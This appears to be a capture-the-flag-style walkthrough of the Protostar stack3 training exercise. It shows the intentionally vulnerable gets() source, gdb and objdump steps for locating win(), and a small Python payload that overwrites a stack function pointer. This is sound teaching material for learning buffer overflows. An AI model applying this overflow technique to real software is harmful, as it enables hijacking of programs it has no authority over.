---
title: "Protostar stack3 walkthrough"
date: 2020-05-21
tags: [buffer overflow, protostar, stack3, walkthrough]
header:
  image: "/images/protostar/protostar.png"
---

## Protostar exercises - [stack3](https://exploit-exercises.lains.space/protostar/stack3/)

#### About
Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)

Hints

both gdb and objdump is your friend you determining where the win() function lies in memory.
This level is at /opt/protostar/bin/stack3

#### Source code:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

#### Procedure:

Similar to stack0, the program is using `gets()` function to write input into a buffer. And the variable 'fp' which is a function pointer needs to be changed from 0 to address of 'win()' function.

So first we need to find 'win()' address using objdump and write it to the address of 'fp' variable

##### Vulnerability:

`gets()` is vulnerable as it is impossible to tell how many characters gets() will reaed. it will continue to store the characters past the end of buffer.
`fgets()` needs to be used instead.


##### Disassembly:

Lets start by disassembling the binary

```
gdb ./stack3
(gdb) set disassembly-flavor intel
(gdb) disassemble main
```


![disassembly]({{site.url}}{{site.baseurl}}/images/protostar/stack3/disassemble.png)

'fp' is stored at $esp+0x5c. It is moved into eax and called at 0x08048475. Out aim is to overwrite $esp value at this point. Lets put breapoint at this call.

```
break *0x08048475
```

Lets execute with input large enough to change $eax

```
r
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
![registers]({{site.url}}{{site.baseurl}}/images/protostar/stack3/registers.png)

We can see that $eax is changed to 0x41414141

We can find address of 'win' function using `x win`
```
(gdb) x win
0x8048424 <win>:        0x83e58955
```

Now, we need to find which part of input is being written to $eax and change it to 0x8048424

So, lets run with input AAAABBBBCCCCDDDDEEEEFFFFIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS and check the registers

![registers-2]({{site.url}}{{site.baseurl}}/images/protostar/stack3/registers-2.png)

$eax contains 0x53535353, which is 'SSSS'

Lets create a simple python program to create the string
```python
padding = "AAAABBBBCCCCDDDDEEEEFFFFIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR"
padding += "\x24\x84\x04\x08"
print padding
```
Lets use the output of this to run stack3

```
python stack3.py > exp
(gdb) r < /home/user/exp
info registers
```

We see $eax is now 0x8048424. So, next instruction would be to execute $eax or win() and print success

![done]({{site.url}}{{site.baseurl}}/images/protostar/stack3/done.png)

We can also find the address of win() using
```
user@protostar:/opt/protostar/bin$ objdump -x ./stack3 | grep win
08048424 g     F .text  00000014              win
```
